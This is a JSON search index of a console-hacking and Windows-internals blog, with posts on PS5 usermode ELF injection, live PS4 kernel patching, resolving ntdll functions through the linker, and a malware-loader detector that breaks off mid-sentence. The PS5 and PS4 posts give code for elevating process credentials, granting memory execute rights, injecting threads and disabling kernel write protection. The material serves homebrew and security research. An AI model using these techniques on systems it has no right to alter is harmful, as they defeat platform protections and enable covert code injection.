[
  
  {
    "title": "Usermode ELF injection on the PlayStation 5",
    "url": "/posts/PlayStation-5-ELF-Injection/",
    "categories": "Console Hacking",
    "tags": "Reverse engineering, PS5, Programming, FreeBSD",
    "date": "2025-09-03 00:00:00 -0300",
    





    
    "snippet": "ELF injection is crucial for developing complex homebrew applications, helping with debugging and instrumentation during security research, and specially for extending application capabilities, suc...",
    "content": "ELF injection is crucial for developing complex homebrew applications, helping with debugging and instrumentation during security research, and specially for extending application capabilities, such as enhancing the UI or creating internal mods for your favorite games.There are a few protections and permission restrictions that prevent simple tasks, such as requesting executable memory pages in user mode (and in kernel mode too, but we’ll leave that for another post), using syscalls like mmap. The main reason for this is to prevent multistage shellcode execution, particularly after a ROP chain but directly after any kind of injection.In this post, we’ll dive into the available methods to request executable memory in user mode, how an injection would work, and especially how to instrument the target process to essentially do everything for us. I’ll be using the 9S project as a showcase, since it’s the result of my research on the topic.And yes, the project name is inspired on the YoRHa No.9 Type S from Nier Automata, for the who played the game I’m sure you will understand the inspiration.Also, inspired by my friend Kewou writings, I’ll be leaving a music to listen while read the article.PlayStation 5 Overall SecurityUnlike its predecessor, the PS4, the PS5 has implemented several new protection measures that make certain tasks more difficult. In particular, the hypervisor prevents many types of modifications to the console firmware by proactively enforcing memory integrity and restricting access to low-level system features. This makes kernel-level exploitation and firmware patching significantly harder, even after achieving code execution in kernel space.The hypervisor implement a feature called “XOM”(eXecute-Only-Memory), in short terms, it avoids that the .text can be read or written and can only be executed. Not only that, some techniques that envolve clear the WP bit from the CR0 register are also useless, since modifiying such bits does generate an vmexit in the HV, that will endup by crashing the console for security (only the WP bit is protect, you can write in the others).Another feature is the SMEP, on the CR4, which protects against execution of usermode pages in kernel mode. Modification/disable on this one also generate an vmexit in the HV.Within this mechanisms, the PS5 also enforces the allocation RW pages in usermode using syscalls like the mmap syscall. Which means that even if you could ROP in usermode, you are unable (in theory) to request new RWX memory pages to execute any other thing.This security features will be detailed in future articles, but this already gives you an idea of the overall difficult of performing firmware level modifications that may allow the requesting of rwx memory in usermode or to modify any kind of process creation variables (patching the exec or mmap)Current exploit and primitivesBy time of the writing, there are currently at least 3 valid usermode entrypoint and 3 public kernel exploits. All of them were reported by different researchers into the PlayStation HackerOne profile. The last possible exploitable PS5 firmware is the 10.01.All exploits provides a RW primitives into the kernel, and that is enough to avoid all the security mechanisms that may avoid injection.To write code into the PS5, I took used the amazing SDK currently available, that supports dynamic linking and wrappers to interact with the kernel’s read and write primitives.Data-only accessMany researchers from the PS5 console hacking scene have helped to find many offsets inside the .data section of the kernel, some assisted by decrypted firmware and others just using patterns into it. The .data section of the kernel is in fact unprotected by the HV for perfomance reasons. Since the PlayStation is mainly based on FreeBSD, it’s “easy” to figure out what one must do first if it want manipulate some process, find the FreeBSD’s proc structure.Elevating the injector processTo perform ELF injection, one has to at least have power over a process to be able to manipulate it’s state to create new threads inside it and to read and write into it’s memory (similar on how Windows’s injectors works). To achieve that, the injector tool must have the necessary permissions to at least call syscalls such as ptrace, as it’s crucial for instrumentation.To do this, we need to manipulate the proc structure in FreeBSD, which contains many attributes of our process.Manipulating the FreeBSD’s proc structureThe FreeBSD’s proc structure is a linked list containing all current processes, it contains basic information such the PID and UID, also contains some Authentication ID’s, find the offset is trivial, once one has access to it can use the Kernel RW primitives to read the proc structure from the kernel .data.struct proc* find_proc_by_name(const char* proc_name){    uint64_t next = 0;    kernel_copyout(KERNEL_ADDRESS_ALLPROC, &amp;next, sizeof(uint64_t)); // 1    struct proc* proc = (struct proc*) malloc(sizeof(struct proc));    do    {        kernel_copyout(next, (void*) proc, sizeof(struct proc)); // 2        if (!strcmp(proc-&gt;p_comm, proc_name))            return proc;        kernel_copyout(next, &amp;next, sizeof(uint64_t));    } while (next);    free(proc);    return NULL;}The example above was extract by a wrapper that I’ve wrote to interact with such kernel data structures, it will use the kernel_copyout function that encapuled the Read primitive from the kernel exploit, to extract the first entry of the proc linked list (1), therefore to read every entry it will need to also perform another Kernel read (2). When a give entry is found by some process name, it will return the copied proc structure.It’s worth notice that with such wrappers, it’s easy to list all the current processes running in the system and it’s PIDs, as a matter of example here’s the code that does that (also in the same file):void list_all_proc_and_pid(){    uint64_t next = 0;    kernel_copyout(KERNEL_ADDRESS_ALLPROC, &amp;next, sizeof(uint64_t));    struct proc* proc = (struct proc*) malloc(sizeof(struct proc));    do    {        kernel_copyout(next, (void*) proc, sizeof(struct proc));        printf(\"%s - %d\\n\", proc-&gt;p_comm, proc-&gt;pid);        kernel_copyout(next, &amp;next, sizeof(uint64_t));    } while (next);    free(proc);}The code is self explainatory, and it’s outputs the following text into the klog:                              List of current running processes name, pid and the proc address entry in the kernel      Elevating Process PrivilegesThe PlayStation proc structure is basically the same as the FreeBSD, but it does contains specific fields created for the console, such as the Authority ID which is added inside the ucred structure, which is part of the struct proc. This structure contains specific codes that describe a process permission of some resources or capabilities. In order to be able to debug remote process, which means use the ptrace and the mdbg syscall families (specific from the console), we need to add this permission into our process.With R/W primitives the code that does that is pretty simple, and is the following://// Search process entr on the allproc linked list// acquire the \"ucred\" structure and elevate it//void set_ucred_to_debugger(){    struct proc* proc = get_proc_by_pid(getpid());    if (proc)    {        //        // Parse process ucred        //        struct ucred ucred;        bzero(&amp;ucred, sizeof(struct ucred));        //        // Read from kernel        //        uintptr_t authid = 0;        uintptr_t ptrace_authid = PTRACE_AUTHID;        kernel_copyout((uintptr_t) proc-&gt;p_ucred + 0x58, &amp;authid, sizeof(uintptr_t));        kernel_copyin(&amp;ptrace_authid, (uintptr_t) proc-&gt;p_ucred + 0x58, sizeof(uintptr_t));        free(proc);    }}The authid is located at offset 0x58 of the ucred structure. Using hardcoded offsets is not recommended, but as the kernel is not open source, and we cannot rely on the structure maintaining its layout. Therefore, it is common to maintain a reversed structure on the researcher’s side (using tools like IDA or Ghidra) and update the value as needed.The PTRACE_AUTHID value is 0x4800000000010003. After setting it, the process is permitted to use debug-related syscalls and functions, which will be explored in the following sections.Requesting usermode executable memoryNow, if you want to inject something into a process, you have two options: either allocate remote executable memory within the target process or overwrite something inside it. In fact, my injector does both. As I wrote, it’s not possible to simply allocate memory pages with PROT_EXEC|PROT_READ|PROT_WRITE, but some processes, like browsers that use JIT to run JavaScript code, still need it.Knowing this, the PS5 provides wrappers to specifically request JIT memory. These API calls are mostly used by browsers or any process that makes use of it (like the Redis server running in the background for caching).In the first version of the injector and the SDK elfldr, it did exactly that. It used to run all the ELF inside JIT memory, which is not ideal because it requires more work to mirror the page.FreeBSD’s vmmap data structure overviewFreeBSD keeps track of all process memory in a structure named vm_map, which is a data structure of allocated pages for a process. It contains an element named struct vm_map_entry header, which is the entry point for all the pages. Internally, it uses two possible data structures: a double-linked list to perform linear searches and a Binary-Search-Tree.Each page entry contains the following structure:struct vm_map_entry {    struct vm_map_entry *prev;    struct vm_map_entry *next;    struct vm_map_entry *left;    struct vm_map_entry *right;    vm_offset_t start;    vm_offset_t end;    vm_offset_t avail_ssize;    vm_size_t adj_free;    vm_size_t max_free;    union vm_map_object object;    vm_ooffset_t offset;    vm_eflags_t eflags;    /*\tOnly in\ttask maps: */    vm_prot_t protection;    vm_prot_t max_protection;    vm_inherit_t inheritance;    int wired_count;    vm_pindex_t lastr;};What matters most is the vm_prot_t protection, which holds the current page protection. It can be PROT_READ, PROT_WRITE, PROT_EXEC, or a combination of them. As mentioned before, the kernel enforces only PROT_READ|PROT_WRITE as the maximum for requested pages from usermode.But with the RW primitives and access to this data structure, one can simply add PROT_EXEC to any page they want. I’ve wrapped this idea in my proc wrapper, which can be used to modify any usermode page protection bit. This was also implemented in the SDK. Initially, the SDK only used the double-linked list fields to perform a simple linear search, which was sufficient most of the time. My contribution was to add the Binary Search Tree algorithm with the correct offsets to increase the page search/patch speed. Nevertheless, with all this shared, the result is that we are now able to:  Jailbreak the process to give it debug capabilities  Request usermode executable memoryThe missing piece is how to combine both of these to map an ELF inside another process’s userspace. This is achieved by using the elfldr.Mapping an ELF in the remote processUnlike Windows, where API calls likeVirtualAllocEx (allocate memory inside another process) exist, this is not true in the Unix world. You don’t have access to such functions to do that you need to instrument the target process to ask it nicely to do it.Behind the scenes, the elfldr uses a ptrace wrapper that can call remote functions. Basically, if you can pause the target process thread, save its state, specifically craft the RIP and the necessary arguments to another address, and resume it, this will result in a call to any remote function. You can check its implementation here.I’ve modified the elfldr source code to only map the ELF inside the process space (nothing more), giving me the opportunity to call it inside another thread. What my injector does is the following:  Use a slightly modified version of the elfldr to map the ELF correctly within the target memory space  Write a small shellcode in the target process to call the pthread_create function, issue an int3 to notify the injector  Detach from the process  The ELF is now running in a different threadAll this can be checked here, but the important piece of code is:intptr_t entry = elfldr_load(proc-&gt;pid, (uint8_t*) elf);...intptr_t args = elfldr_payload_args(proc-&gt;pid);printf(\"[+] ELF entrypoint: %#02lx [+]\\n[+] Payload Args: %#02lx [+]\\n\", entry, args);entry is, as the name suggests, the entrypoint of the executable. It points to the SDK’s CRT, which needs the payload_args_t structure to work correctly. This structure contains important information provided by the exploit, such as the Kernel R/W primitives and some addresses. This is used by its dynamic linker to resolve necessary functions and apply necessary process permission patches to work properly. The injected code that bootstraps the ELF is simple; here’s its core:int __attribute__((section(\".stager_shellcode$1\")))  stager(SCEFunctions* functions){    pthread_t thread;    functions-&gt;pthread_create_ptr(&amp;thread, 0, (void *(*)(void *)) functions-&gt;elf_main, functions-&gt;payload_args);    asm(\"int3\");    return 0;}t’s very similar to what you would expect in environments like Windows; the main difference is the existence of the asm(\"int3\"), which, as mentioned before, serves to notify the injector that it’s time to detach (it also significantly speeds up execution). With all that, the ELF is now successfully running on any target process.Example: Injecting an ELF in the UIAs an example, the following hello world will be executed inside the SceShellUI process, which is the entire PS5’s UI process.#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;ps5/klog.h&gt;int main() {  klog_printf(\"Hello from PID %d\\n\", getpid());  return 0;}I’ve created 9S as a server running on port 9033. It expects the following struct as an input argument:typedef struct __injector_data_t{    char proc_name[MAX_PROC_NAME];    Elf64_Ehdr elf_header;} injector_data_t;To make life easier, I created a simple Python script to send any ELF file to it. It can be used as:  python3 ./send_injection_elf.py SceShellUI hello_world.elf IPFirst, let’s check the SceShellUI PID to make sure the injection works:                              PID check      Now, let’s inject the ELF and see if it’s really running inside the target process:                          ELF injection successfully      ConclusionThis concludes this article. I wrote this injector a while ago and didn’t plan to write about it, but recently, after talking with a few friends about knowledge sharing, I realized that this type of material is essential. It’s not entirely specific to the PS5 and has a lot to do with OS internals, such as those in FreeBSD.Also, I’ve been using this tool extensively this past year, especially for debugging, experimentation, and reverse engineering projects. If I’m using it that much, why can’t someone else use it too?ReferencesThere are many references I’ve used, I may miss some, but here’s all the material I used:  FreeBSD source code  elfldr  SDK  Mira  gdbsrvAlso, after this tool’s publication, a friend of mine wrote the entire ptrace instrumentation tool, inspired on the originally written for FreeBSD/PS5, for a cool Linux project named plinux."
  },
  
  {
    "title": "How to patch the running PlayStation 4 kernel",
    "url": "/posts/ps4-kernel-patching-guide/",
    "categories": "Console Hacking",
    "tags": "Reverse engineering, PS4",
    "date": "2024-05-30 00:00:00 -0300",
    





    
    "snippet": "One of the first tasks when hacking into the PlayStation kernel is to apply proper patches. Perhaps enabling the UART for better logging using serial COM, enabling user/kernel address access, or ev...",
    "content": "One of the first tasks when hacking into the PlayStation kernel is to apply proper patches. Perhaps enabling the UART for better logging using serial COM, enabling user/kernel address access, or even enabling the MAP_SELF flag support into the mmap syscall, which can be used to decrypt native modules using the SAMU behind the scenes.The first step is actually acquiring the kernel. You can do this by using the PS4-Kernel-Dumper payload on your hacked PS4. After acquiring the kernel image, you can either reverse the kernel by yourself or search for known offsets.Calculating the correct offsetThe simplest way to calculate the offset is by subtracting the wanted address from the kernel base. This is required since the PS4 implements KASLR. For example, let’s calculate the offset of the usermode process ASLR calculation inside the kernel image. I’m using firmware version 10.5:I will not enter into the details of this function, but in general, it’s where the SELF (Signed ELF) image is parsed and the process is created. One of the steps is to define the image base address using ASLR. If some specific conditions are matched, it will use a fixed base address of 0x400000, which is great to have all the time to make debugging easier. So, in order to apply the kernel patch, we can just nop the jz conditional instruction to always set the base address to a fixed one, even if it’s not supposed to.The jz address in the dumped kernel is 0xFFFFFFFF82545E04, and the kernel base address (not loaded) is 0xFFFFFFFF82200000, so the offset is 0xFFFFFFFF82545E04 - 0xFFFFFFFF82200000 = 0x345e04.Getting the running kernel base addressSince we have the dumped kernel in our hands, we can pick any known previous offset and calculate the same one in memory to determine the kernel base address. One of the most commonly used methods is to extract the address contained in the MSR_LSTAR (0xc0000082) MSR, which is the MSR used to store the syscall handling address. Picking this address is very straightforward using the rdmsr instruction. With that in hand, we can easily calculate the current kernel base address:inline uint64_t __readmsr(uint32_t msr) // wrapper into the rdmsr instruction{    uint32_t low, high;    asm volatile(\"rdmsr\" : \"=a\"(low), \"=d\"(high) : \"c\"(msr));    return (low | ((uint64_t) high &lt;&lt; 32));}inline uint64_t get_kernel_base_addr(){    return __readmsr(MSR_LSTAR) - Xfast_syscall_offset;}The quickest way to find the Xfast_syscall_offset value is by looking into the kernel image for writemsr into the MSR_LSTAR. It occurs in the earliest parts of the firmware code. One can easily find it by searching for the following code pattern: B9 82 00 00 C0 48 89 C2 48 C1 EA 20 0F 30, which are the opcodes used when writing into it:In general, once you pick that offset and subtract the running (with KASLR) Xfast address, you will get the kernel base address. This idea can be applied with any previously known offsets that you can find at runtime as well. For contrast, that’s how the PPPwn exploit from TheFlow defeats KASLR, but instead of use the Xfast_syscall offset, it make use of the PPPOE_SOFTC_LIST offset, which is part of the vulnerability itself.Patching the kernelWith the kernel base address acquired, before any patch can be applied, you must disable the Write Protect bit from the CR0 register (AMD’s manual - 3.1.1 CR0 Register). This bit controls permissions to write into read-only pages. Since the kernel code itself (.text) isn’t writable, one must first disable this bit, patch it, and then re-enable it. Since writing kernel payloads in the PS4 jailbreak context means that you are already running after a kernel exploit, you have the ability to read/write into control registers.inline uint64_t __readcr0(){    uint64_t value;    asm volatile(\"movq %%cr0, %0\" : \"=r\"(value));    return value;}inline void __writecr0(uint64_t value){    asm volatile(\"movq %0, %%cr0\" ::\"r\"(value));}...uint64_t cr0 = __readcr0(); // store the cr0__writecr0(cr0 &amp; ~CR0_WP); // Disable write protection in read-only pages, allows us to patch the running kernel// Freely patch the kernel codeuint8_t* kmem = (uint8_t*) &amp;kernel_base[0x345e04];kmem[0] = 0x90; // nopkmem[1] = 0x90; // nop__writecr0(cr0); // restore the original cr0To patch it, you can treat the kernel image as a regular uint8_t* buffer or something similar, and simply write the required opcodes into it.Links &amp; resources  My Playstation Research notes  PS4-Kernel-Dumper  PPPwn stage 1 source code  Mira “CFW” project  AMD64 manual"
  },
  
  {
    "title": "Quick Tip: Stop Using GetProcAddress and Let the Linker Do the Job for You",
    "url": "/posts/Stop-Using-GetProcAddress-And-Let-The-Linker/",
    "categories": "Programming",
    "tags": "Programming, Windows Internals",
    "date": "2023-08-15 21:00:00 -0300",
    





    
    "snippet": "For a long time, Linux was my primary subject of study. I didn’t find Windows internals particularly interesting until I took on a malware analysis task. It was during this task that I began to app...",
    "content": "For a long time, Linux was my primary subject of study. I didn’t find Windows internals particularly interesting until I took on a malware analysis task. It was during this task that I began to appreciate the world of Reverse Engineering on the Windows platform, largely due to the abundance of resources and tools available. Unlike Linux, where everything is open source and accessible through the unistd.h header (equivalent to windows.h in Linux), Windows introduced me to the concept of so-called ‘Undocumented functions.’In this concise post, my intention is to offer you a quick tip on utilizing undocumented APIs, such as those found in ntdll.dll, and demonstrate how compiler-specific keywords can guide the Microsoft Linker to efficiently resolve these functions. This approach eliminates the need for elaborate techniques to load function addresses. Naturally, there are situations where the runtime resolution approach remains necessary, especially when dynamically loading non-standard libraries.Quick recap: What are undocumented functions ?Undocumented functions are API functions that aren’t intended to be accessible for developers based on official vendor documentation, particularly within Microsoft’s documentation. However, many of these functions offer significant utility. Take, for instance, NtQueryInformationProcess, a function that furnishes crucial insights about a given process. The challenge isn’t confined solely to undocumented functions but also extends to undocumented structures, such as the PEB (Process Environment Block), which exist in a partially documented state. Some of these functions are documented but not made available through standard headers.To tackle this challenge, a wealth of resources, books, and websites are dedicated exclusively to cataloging and documenting these undocumented functions. Notably, projects like Wine and ReactOS serve as invaluable sources for locating API definitions for these functions.When I was learning about Windows programming I learned that I could load these functions by extracting their signatures from these undocumented sources and by employing runtime resolution APIs like GetProcAddress, I could procure the function addresses and cast them into function pointers, facilitating the usage of these functions.#include &lt;iostream&gt;#include &lt;windows.h&gt;#define NTSTATUS LONG#define NT_SUCCESS( Status ) ( ( (NTSTATUS) (Status) ) &gt;= 0 )using pNtAllocateVirtualMemory = NTSTATUS ( * )(\tHANDLE    ProcessHandle,\tPVOID* BaseAddress,\tULONG_PTR ZeroBits,\tPSIZE_T   RegionSize,\tULONG     AllocationType,\tULONG     Protect);int main(){\tPVOID\tBuff\t\t= nullptr;\tSIZE_T\tAllocSize\t= 0x1000;\tpNtAllocateVirtualMemory NtAllocateVirtualMemory = reinterpret_cast&lt; pNtAllocateVirtualMemory &gt;( GetProcAddress ( LoadLibraryA ( \"ntdll.dll\" ), \"NtAllocateVirtualMemory\" ) );\tNTSTATUS status = NtAllocateVirtualMemory ( GetCurrentProcess(), &amp;Buff, 0, &amp;AllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\tif (NT_SUCCESS ( status ))\t{\t\tstd::printf ( \"Memory Allocated with the NtAllocateVirtualMemory function pointer sucessfully at 0x%p! W &amp; R a byte... \\n\" );\t\t*(BYTE*) Buff = 0xF3;\t\tstd::printf ( \"Buff[ 0 ] = 0x%x\\n\", *( BYTE* )Buff);\t}\tstd::printf ( \"Status %x\\n\", status );}In the example above, my goal is to work with NtAllocateVirtualMemory. Even though it’s partially documented by Microsoft’s MSDN, you won’t find it in the regular Windows headers. So, how do you tackle this? Well, it’s a trick many folks use: you employ GetProcAddress with a handle to the DLL, and you request the NtAllocateVirtualMemory address. Then, just cast this address to match the definition of a function pointer.                              Fig.1 Working code with GetProcAddress usage      But how can we simply avoid using the combination of LoadLibrary and GetProcAddress? Or better yet, how can we use these functions without needing to do tricks to fetch their addresses?Quick recap: The compilation processThe C/C++ compilation process is quite straightforward in theory, with these steps:  Preprocessor          Here, the compiler consolidates all your source code and headers into a single point, preparing them for the actual compilation.        Compilation          In this step, your code gets translated into Assembly and is poised for conversion into machine code.        Assembler:          After compilation, your code is transformed into assembly/binary format and bundled in an object code format (.obj or .o).        Linker:          The object file now incorporates all the functions you used, integrating them into the final executable. This ensures a fully functioning executable with resolved external functions/libraries.      To simplify the process of dealing with undocumented functions, we can make a small adjustment during the Linking step. When this step is reached, we can direct the Linker to use the actual address of NtAllocateVirtualMemory. This can be easily accomplished using compiler-specific keywords that we insert into our code!Just use the #pragma and __declspec keywordsYou can make your life easier by employing the #pragma and __declspec keywords. These compiler-specific keywords tools let you instruct the MSVC compiler to find the NtAllocateVirtualMemory inside the static library ntdll.lib, provided my Microsoft.#pragma comment(lib, \"ntdll.lib\")// ...extern \"C\" __declspec( dllimport ) NTSTATUS NtAllocateVirtualMemory (\tHANDLE    ProcessHandle,\tPVOID * BaseAddress,\tULONG_PTR ZeroBits,\tPSIZE_T   RegionSize,\tULONG     AllocationType,\tULONG     Protect);// ..Now there is no need to use the GetProcAddress!PVOID\tBuff = nullptr;SIZE_T\tAllocSize = 0x1000;NTSTATUS status = NtAllocateVirtualMemory ( GetCurrentProcess (), &amp;Buff, 0, &amp;AllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );if (NT_SUCCESS ( status )){    std::puts ( \"Memory Allocated sucessfully at 0x%p! W &amp; R a byte... \\n\" );    *(BYTE*)Buff = 0xF3;    std::printf ( \"Buff[ 0 ] = 0x%x\\n\", *(BYTE*)Buff );}std::printf ( \"Status %x\\n\", status );                              Fig.2 Using Linker keywords      By using these keywords, you’re essentially telling the Microsoft Linker to focus on ntdll.lib while building your project. The #pragma comment(lib, ...) let you specify a static library to be used in your project, therefore we specify the ntdll.lib.The __declspec( dllimport ) keyword is optional, but it’s basically telling the compiler that this function definition can be found in the IAT, is like waving a flag, announcing that this function definition originates from another library, not your source code.Since these functions stem from C, rather than C++, remember to use the extern \"C\" keyword to disable the name mangling, that way the function symbol name will match exactly to the one defined in the ntdll.lib. Here’s a tip: if you’re dealing with multiple function definitions, you can gather them all in one neat block using brackets.extern \"C\"{\t// Your definitions}Is worth to remember that the above approach only works if the function of insterest is exported by the library(.lib) file that you want to use!Does this works for kernel Drivers programming ?This isn’t magic; it’s simply how linkers operate. The same concept holds true for kernel mode programming! If you’re aiming to utilize undocumented functions in your driver, you can apply the same approach:extern \"C\" __declspec( dllimport ) NTSTATUS NTAPI ZwQuerySystemInformation (    ULONG SystemInformationClass,     PVOID SystemInformation,     ULONG SystemInformationLength,     PULONG ReturnLength );The only difference here is that, since you’re already working on a kernel driver, you will be using the ntoskrnl.exe executable as your main library. Therefore, there’s no need to employ the #pragma keyword in this context! Also, if you are not using C++ to code your driver you can remove the extern \"C\" as well.ConclusionWell, that was a simple tip post that I found very useful. I’ve seen a lot of people not knowing this and using LoadLibrary (or any other) + GetProcAddress all the time. There are a lot of interesting features in these keywords that are worth taking a look at.Thanks!08/16/2023 - Edit\t- Fix some concepts related to the compiler-specific keywords and the linking process, thanks @cxiao to let me know about it."
  },
  
  {
    "title": "Designing a Malware Loader detector with Guard Violation Exceptions",
    "url": "/posts/Detecting-injected-code-with-page-guards/",
    "categories": "Malware-Research",
    "tags": "Malware Research, Programming, Windows Internals",
    "date": "2023-07-11 10:52:00 -0300",
    





    
    "snippet": "Recently, I made the decision to finally publish my tool focused on unpacking, called Shinigami. The idea for Shinigami came to me two years ago, but I never actually implemented it until now. Init...",
    "content": "Recently, I made the decision to finally publish my tool focused on unpacking, called Shinigami. The idea for Shinigami came to me two years ago, but I never actually implemented it until now. Initially, it was designed to dump implants injected via process hollowing. However, I also added support for generic malware loaders that implement manual mapping or shellcode injection. All of this is made possible by a memory page protection bit called PAGE_GUARD, which gives me the ability to detect when newly allocated memory is executed, read, or written to.In this article, we will dive into how we can utilize this mechanism to detect code flow redirection to newly allocated memory areas, which are often associated with injection. We will also discuss the drawbacks and limitations surrounding this technique. Also I want to talk a little about the Shinigami memory monitoring implementation and it’s limitations, also address improvements for future versions.How page guards worksEvery time you allocate memory using API calls like VirtualAlloc or NtAllocateVirtualMemory, you have the capability to choose the memory protection for the page allocated.There are several options available, such as executable (PAGE_EXECUTE), read-only (PAGE_READ), or write-only (PAGE_WRITE). By using the OR operator, you can combine these flags, creating combinations like PAGE_EXECUTE_READWRITE or PAGE_WRITE | PAGE_READ, among others. However, there is a special flag allowed by the Windows API called PAGE_GUARD and when this flag is set, it adds the GUARD page bit to the Page Table Entry (PTE).Verifying the Page Table Entry (PTE) using WinDBGConsider the following example code:INTmain(){\tDWORD OldProt;\tBYTE* RandomMemory = (BYTE*) VirtualAlloc(NULL, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\tif (!RandomMemory)\t{\t\tstd::printf(\"Error allocating memory!\\n\");\t\treturn EXIT_FAILURE;\t}\tstd::printf(\"Allocated 0x%lx bytes at 0x%p without PAGE_GUARD\\n\", PAGE_SIZE, RandomMemory);\tfor (int i = 0; i &lt; 16; ++i)\t    RandomMemory[i] = (uint8_t) (i + 1);\tgetchar();\tstd::puts(\"Adding PAGE_GUARD\");\tVirtualProtect(RandomMemory, PAGE_SIZE, PAGE_READWRITE | PAGE_GUARD, &amp;OldProt);\t        std::printf(\"Inspect the PTE of 0x%p\", RandomMemory);\tgetchar();\tVirtualFree(RandomMemory, NULL, MEM_RELEASE);\treturn EXIT_SUCCESS;}Executing:In this code snippet, we allocate some memory with read and write protections (PAGE_READWRITE). Then, we write some data to the allocated memory and use the VirtualProtect function to add a new protection, PAGE_GUARD, to this memory page. With WinDBG attached in kernel debugger mode, let’s examine the Page Table Entry (PTE) and see how the CPU views this memory area.First find the process EPROCESS structure address and change the debugger to inside the process context:0: kd&gt; !process 0 0 PageGuardExamples.exePROCESS ffffbc0aa8f4c080    SessionId: 1  Cid: 1268    Peb: ac42d18000  ParentCid: 1318    DirBase: 17327b000  ObjectTable: ffff9489039bf4c0  HandleCount:  38.    Image: PageGuardExamples.exe0: kd&gt; .process /i /r ffffbc0aa8f4c080You need to continue execution (press 'g' &lt;enter&gt;) for the contextto be switched. When the debugger breaks in again, you will be inthe new process context.0: kd&gt; gBreak instruction exception - code 80000003 (first chance)nt!DbgBreakPointWithStatus:fffff805`34a055d0 cc              int     3Now inside the process we can look at PTE, using the !pte command, before add the PAGE_GUARD bit:Every virtual address need to be translated to a physical address when the paging is enabled in the OS, all moderns operating system works that way, in order to do this one must employ a paging algorithm, long story short, by the end of the algorithm there is a structure called Page Frame Number (pfn), which represents where in the physical memory the given page was allocated, this structure holds a couple of bits containing metadata about this area, in our case ---D---UW-V, which they mean:  D          Dirty flag, The Dirty flag indicates whether the page has been modified since its allocation, this happened when we wrote a couple of bytes into this memory (also this is a good place to verify if something has changed in some memory that you are monitoring for some reason)        UW          The User-Mode Write flag signifies that the page is writable by user-mode code. Since it was allocated by our process, we have permission to write to it.        V          The “Valid” flag simply indicates that the memory page is valid and usable.      Perfect, so everything looks good so far! Now, let’s explore what happens when we modify the protections and add the “PAGE_GUARD” bit.Now, things are different. We can no longer see the contents of the PFN. We only have the information that a PFN should exist at address 0x1583ec with ReadWrite protections. This output essentially indicates that the memory is no longer accessible as it was before. When we added the PAGE_GUARD bit, the Memory Management Unit (MMU) took the responsibility of handling access to this page and raise a exception of type STATUS_GUARD_VIOLATION. This exception needs to be handled by our operating system.Handling page fault exceptionsTo handle the exception caused by the page access, we can register an exception handler using the Vectorized Exception Handling (VEH) mechanism. VEH enables us to register a callback function that gets called for every exception raised in our process. Within this function, we can filter out the STATUS_GUARD_VIOLATION exception and examine the exception context to determine if it occurred in the memory we previously allocated.To achieve this, we first need to register an exception handler in our program using the AddVectoredExceptionHandler function. This function expects a callback function with the following definition:typedef LONG (NTAPI *PVECTORED_EXCEPTION_HANDLER) (struct _EXCEPTION_POINTERS *ExceptionInfo);Additionally, if we want our exception handler to be called before any other default exception handler, we need to set it as the first handler.This can be useful if we want to be the first to handle this exception. Now, let’s add the exception handler to the previous code. It’s also a good practice to create a data structure to hold metadata related to the allocated memory.For this example, I chose to use a hashtable (unordered_map) and a simple struct called MemInfo to store basic information about the memory. In the Shinigami project, I used the &lt;list&gt; from the C++ STL to hold a similar struct as used in this example.struct MemInfo{\tULONG_PTR Address;\tSIZE_T Size;\tBOOL Prot;};std::unordered_map&lt;ULONG_PTR, MemInfo*&gt; TrackedMemory;Logically, you will need to register the exception handler before any allocation that you want to monitor happens:AddVectoredExceptionHandler(TRUE, VEHHandler); // &lt;--- Register callbackBYTE* RandomMemory = (BYTE*) VirtualAlloc(NULL, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, Prot);// Code related alloc check// ...MemInfo memInfo;memInfo.Address = (ULONG_PTR) RandomMemory;memInfo.Prot\t= Prot;memInfo.Size\t= PAGE_SIZE;TrackedMemory.insert( std::make_pair( (ULONG_PTR) RandomMemory, &amp;memInfo) );After setting up the example, when the code inserts the PAGE_GUARD bit into the memory page and any access is made to it, our VEHHandler will be called first. We can then filter out the exception type and verify if the exception occurred inside the monitored memory.Processing the exceptionTo process the exception, we first need to filter and verify if the ExceptionCode corresponds to STATUS_GUARD_PAGE_VIOLATION. This information is part of a structure called  EXCEPTION_POINTERS which holds details about the exception code that has occurred.enum ACCESS_TYPES{\tREAD = 0,\tWRITE};LONG WINAPI VEHHandler(EXCEPTION_POINTERS* pExceptionPointers){\tPEXCEPTION_RECORD ExceptionRecord = pExceptionPointers-&gt;ExceptionRecord;\tULONG_PTR AccessType;\tULONG_PTR ExceptionAddress;\tswitch (ExceptionRecord-&gt;ExceptionCode)\t{\tcase STATUS_GUARD_PAGE_VIOLATION:\t{\t\tif (ExceptionRecord-&gt;NumberParameters &lt; 2) return EXCEPTION_CONTINUE_SEARCH;\t\tAccessType = ExceptionRecord-&gt;ExceptionInformation[0];\t\tExceptionAddress = ExceptionRecord-&gt;ExceptionInformation[1];\t\tauto MemInfo = TrackedMemory.find(ExceptionAddress);\t\tif (MemInfo == TrackedMemory.end()) return EXCEPTION_CONTINUE_SEARCH;\t\tif (AccessType == READ)\t\t\tstd::printf(\"A read attempt was detected in the monitored memory address: 0x%p\\n\", (ULONG_PTR*)MemInfo-&gt;second-&gt;Address);\t\telse if (AccessType == WRITE)\t\t\tstd::printf(\"A write attempt was detected in the monitored memory address: 0x%p\\n\", (ULONG_PTR*)MemInfo-&gt;second-&gt;Address);\t\tpExceptionPointers-&gt;ContextRecord-&gt;EFlags |= 0x100;\t\t\t\tstd::puts(\"Proceeding with the code execution...\");\t\treturn EXCEPTION_CONTINUE_EXECUTION;\t}\tcase STATUS_SINGLE_STEP:\t\treturn EXCEPTION_CONTINUE_EXECUTION;\t}\treturn EXCEPTION_CONTINUE_SEARCH;}Inside the EXCEPTION_POINTERS struct, we can extract another struct called EXCEPTION_RECORD, This struct contains information about the exception itself. Each exception has different kinds of information that can be extracted using the ExceptionInformation attribute, which is an array of ULONG_PTR values, which is an array of ULONG_PTR. The number of arguments available can be obtained from the NumberParameters attribute, and the type of each parameter depends on the specific exception that was triggered.Since the STATUS_GUARD_PAGE_VIOLATION is undocumented on the ExceptionInformation structure, by some research I have found that it has the same information as the EXCEPTION_ACCESS_VIOLATION and by the Microsoft documentation it says:“The first element of the array contains a read-write flag that indicates the type of operation that caused the access violation. If this value is zero, the thread attempted to read the inaccessible data. If this value is 1, the thread 